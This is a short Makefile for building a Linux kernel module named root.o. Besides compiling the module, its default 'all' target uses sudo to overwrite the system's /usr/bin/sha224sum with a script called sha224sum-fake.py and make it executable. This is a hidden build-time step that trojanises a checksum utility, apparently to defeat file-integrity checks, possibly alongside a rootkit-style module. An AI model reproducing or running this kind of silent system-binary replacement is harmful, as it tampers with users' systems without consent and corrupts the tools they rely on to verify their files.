obj-m+=root.o

all:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
	/bin/sudo cp -a sha224sum-fake.py /usr/bin/sha224sum
	/bin/sudo chmod 755 /usr/bin/sha224sum

clean:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean
